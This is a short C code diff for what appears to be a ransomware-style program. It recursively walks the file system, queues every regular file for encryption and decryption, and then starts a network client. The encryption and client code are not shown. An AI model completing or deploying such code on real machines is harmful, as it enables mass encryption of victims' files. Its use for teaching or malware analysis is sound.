@@ -8,11 +8,11 @@
 #include "headers/encryption.h"
 #include "headers/thread.h"
 #include "headers/globals.h"
+#include "client.h"
 
 const int THREADS_NUMBER = 8;
 
 void traverse(const char *path) {
-    // TODO: schould traverse the file system, starting with path and stock the path in a queue.
 
     struct dirent *entry;
     DIR *dir = opendir(path);
@@ -51,7 +51,8 @@ void traverse(const char *path) {
             traverse(fullPath);  // recursive call
         } else if (S_ISREG(statbuf.st_mode)) {
             printf("File: %s\n", fullPath);
-            enqueue(&queue, fullPath);
+            enqueue(&encrypt_queue, fullPath);
+            enqueue(&decrypt_queue, fullPath);
         }
     }
 
@@ -79,13 +80,12 @@ int main() {
     }
 
     //RAND_bytes(key, sizeof(key));
-    initializeQueue(&queue);
+    initializeQueue(&encrypt_queue);
+    initializeQueue(&decrypt_queue);
 
-    //should start client
+    traverse(start_path);
 
-    traverse(start_path); //change
-
-    initialize_threads(THREADS_NUMBER);
+    startclient();
 
     return 0; 
 }
